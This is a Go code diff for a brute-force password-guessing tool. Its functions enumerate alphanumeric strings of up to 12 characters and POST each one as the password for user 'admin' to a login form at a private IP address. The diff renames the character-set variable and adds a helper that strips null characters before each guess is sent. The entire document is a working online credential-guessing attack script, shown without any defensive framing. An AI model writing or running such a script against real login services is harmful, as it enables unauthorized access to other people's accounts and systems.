@@ -8,23 +8,22 @@ import (
 	"strings"
 )
 
-func nextLetter(login []rune, count []rune, place []int, channel chan []rune) {
+func nextLetter(login []rune, dict []rune, place []int, channel chan []rune) {
 
 	for {
-
 		x := 1
 		for index := 0; index < x; index++ {
 
 			//zarazi pripadny presah indexu
 			if x == 12 {
 				break
-			} else if login[index] == count[61] {
-				login[index] = count[0]
+			} else if login[index] == dict[61] {
+				login[index] = dict[0]
 				place[index] = 0
 				x++
 
 			} else {
-				login[index] = count[place[index]+1]
+				login[index] = dict[place[index]+1]
 				place[index]++
 			}
 		}
@@ -32,7 +31,7 @@ func nextLetter(login []rune, count []rune, place []int, channel chan []rune) {
 	}
 }
 
-func setup(login []rune, count []rune, place []int) {
+func setup(login []rune, dict []rune, place []int) {
 
 	for i := 0; i < 12; i++ {
 		place[i] = -1
@@ -40,7 +39,7 @@ func setup(login []rune, count []rune, place []int) {
 	}
 	//nastavi prvni hodnoty
 	place[0] = 0
-	login[0] = count[0]
+	login[0] = dict[0]
 }
 
 func communication(channel chan []rune) {
@@ -48,8 +47,10 @@ func communication(channel chan []rune) {
 	for {
 		login := <-channel
 
-		//fmt.Println(string(login))
-		response, err := http.PostForm("http://192.168.0.52:9000/login", url.Values{"login": {"admin"}, "password": {string(login)}})
+		str := makeCleanString(login)
+
+		//fmt.Println(str)
+		response, err := http.PostForm("http://192.168.0.52:9000/login", url.Values{"login": {"admin"}, "password": {str}})
 
 		if err != nil {
 			fmt.Println("neco se stalo: ", err.Error())
@@ -65,8 +66,20 @@ func communication(channel chan []rune) {
 	}
 }
 
+func makeCleanString(dirtyRunes []rune) string {
+
+	str := ""
+	for _, v := range dirtyRunes {
+		if v == 0 {
+			continue
+		}
+		str += string(v)
+	}
+	return str
+}
+
 func main() {
-	count := []rune{
+	dict := []rune{
 		'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
 		'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z',
 		'1', '2', '3', '4', '5', '6', '7', '8', '9', '0'}
@@ -75,8 +88,8 @@ func main() {
 	place := make([]int, 12, 12)
 	channel := make(chan []rune)
 
-	setup(login, count, place)
+	setup(login, dict, place)
 
-	go nextLetter(login, count, place, channel)
+	go nextLetter(login, dict, place, channel)
 	communication(channel)
 }
